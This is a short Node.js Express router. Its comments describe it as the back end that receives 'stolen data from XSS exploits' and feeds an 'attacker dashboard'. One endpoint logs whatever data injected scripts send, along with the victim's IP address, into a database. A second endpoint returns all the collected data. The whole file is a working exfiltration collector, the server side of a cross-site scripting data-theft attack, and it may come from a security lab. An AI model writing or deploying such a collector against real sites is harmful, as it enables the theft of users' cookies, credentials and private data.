const express = require('express');
const router = express.Router();
const AttackerData = require('../models/AttackerData');

// Endpoint to receive stolen data from XSS exploits
router.post('/log', async (req, res) => {
  try {
    const { type, data, source } = req.body;
    
    // Store the stolen data
    const attackerData = new AttackerData({
      type: type || 'unknown',
      data: data || JSON.stringify(req.body),
      source: source || req.ip || req.connection.remoteAddress,
    });
    
    await attackerData.save();
    
    res.json({ success: true, message: 'Data logged' });
  } catch (error) {
    console.error('Error logging attacker data:', error);
    res.status(500).json({ error: 'Failed to log data' });
  }
});

// Get all stolen data (for attacker dashboard)
router.get('/data', async (req, res) => {
  try {
    const data = await AttackerData.find().sort({ timestamp: -1 });
    res.json(data);
  } catch (error) {
    console.error('Error fetching attacker data:', error);
    res.status(500).json({ error: 'Failed to fetch data' });
  }
});

module.exports = router;

